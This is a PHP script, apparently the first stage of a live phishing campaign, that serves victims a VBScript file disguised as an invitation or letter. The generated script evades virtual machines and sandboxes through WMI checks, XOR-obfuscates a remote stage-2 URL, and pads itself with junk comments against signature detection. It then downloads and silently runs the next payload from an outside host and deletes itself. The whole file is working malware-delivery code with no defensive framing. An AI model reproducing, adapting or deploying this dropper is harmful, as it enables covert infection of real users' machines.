<?php
// stage1.php - Fixed version (no name redefined error)
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "stage1_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$stage2Url = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php";

$xorKey = rand(40, 90);
$encrypted = "";
for ($i = 0; $i < strlen($stage2Url); $i++) {
    $encrypted .= "Chr(" . (ord($stage2Url[$i]) ^ $xorKey) . ")&";
}
$encrypted = rtrim($encrypted, "&");

$junkLines = rand(5, 18);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' " . bin2hex(random_bytes(rand(4, 12))) . "\r\n";
}

echo <<<VBS
' System Helper
On Error Resume Next

Dim score, objShell, objFSO, http, stream, stage2, tempFile, k, svc, item, t, procCount
score = 0
k = $xorKey

Function C(v, n)
    Dim x
    v = LCase(CStr(v))
    For Each x In n
        If InStr(v, LCase(CStr(x))) > 0 Then
            C = True
            Exit Function
        End If
    Next
    C = False
End Function

Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")

For Each item In svc.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem")
    t = item.Manufacturer & " " & item.Model
    If C(t, Array("vmware","virtualbox","virtual machine","kvm","qemu","xen","parallels","hyper-v")) Then score = score + 3
Next

For Each item In svc.ExecQuery("SELECT Manufacturer,SMBIOSBIOSVersion FROM Win32_BIOS")
    t = item.Manufacturer & " " & item.SMBIOSBIOSVersion
    If C(t, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
Next

procCount = 0
For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
    procCount = procCount + 1
Next
If procCount < 35 Then score = score + 1

If score >= 3 Then
    WScript.Sleep 1800000
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

stage2 = $encrypted
tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\u" & Int(Rnd*99999) & ".vbs"

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", stage2, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile tempFile, 2
    stream.Close
    objShell.Run "wscript.exe """ & tempFile & """", 0, False
End If

objFSO.DeleteFile WScript.ScriptFullName, True

$junk
WScript.Quit
VBS;
?>
